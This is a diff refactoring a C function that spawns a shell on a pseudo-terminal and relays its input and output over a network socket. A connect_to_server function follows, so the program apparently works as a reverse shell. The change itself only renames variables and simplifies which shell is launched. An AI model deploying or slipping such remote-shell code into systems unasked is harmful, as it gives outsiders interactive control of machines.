@@ -141,17 +141,17 @@ void create_pty(int socket_fd)
     int pty_fd;
 
     // Hold pid values for child processes
-    pid_t child_one_pid, child_two_pid;
+    pid_t shell_pid, relay_pid;
 
     // We will now create a PTY device
     // along with a child process
     //
-    // pty_fd will hold the device itself
-    // child_one_pid will hold the child process
-    child_one_pid = forkpty(&pty_fd, NULL, NULL, NULL);
+    // pty_fd will hold the PTY device itself
+    // shell_pid will hold the child process that runs the shell
+    shell_pid = forkpty(&pty_fd, NULL, NULL, NULL);
 
     // Check if child process creation failed
-    if (child_one_pid < 0)
+    if (shell_pid < 0)
     {
         perror("forkpty");
         exit(EXIT_FAILURE);
@@ -159,15 +159,9 @@ void create_pty(int socket_fd)
 
     // Execute the actual shell program
     // in the child process
-    if (child_one_pid == 0)
+    if (shell_pid == 0)
     {
-// Linux or Windows (MSYS2)
-#if defined(__linux__) || defined(__MSYS__)
-        execlp("bash", "bash", NULL);
-// macOS
-#elif defined(__APPLE__)
-        execlp("zsh", "zsh", NULL);
-#endif
+        execlp("sh", "sh", NULL);
         perror("execlp");
         exit(EXIT_FAILURE);
     }
@@ -187,10 +181,12 @@ void create_pty(int socket_fd)
     // background
     
     // Create the second child process
-    child_two_pid = fork();
+    // that relays data between the socket
+    // and the PTY
+    relay_pid = fork();
 
     // Check if child process creation failed
-    if (child_two_pid < 0)
+    if (relay_pid < 0)
     {
         perror("fork");
         exit(EXIT_FAILURE);
@@ -198,16 +194,16 @@ void create_pty(int socket_fd)
 
     // Run rest of the program in the
     // child process
-    if (child_two_pid == 0)
+    if (relay_pid == 0)
     {
         monitor_fd(socket_fd, pty_fd);
         close(socket_fd);
         close(pty_fd);
-        waitpid(child_one_pid, NULL, 0);
+        waitpid(shell_pid, NULL, 0);
     }
 
     // Exit the parent process
-    if (child_two_pid > 0) return;
+    if (relay_pid > 0) return;
 }
 
 int connect_to_server(const char *ip, const uint16_t port)
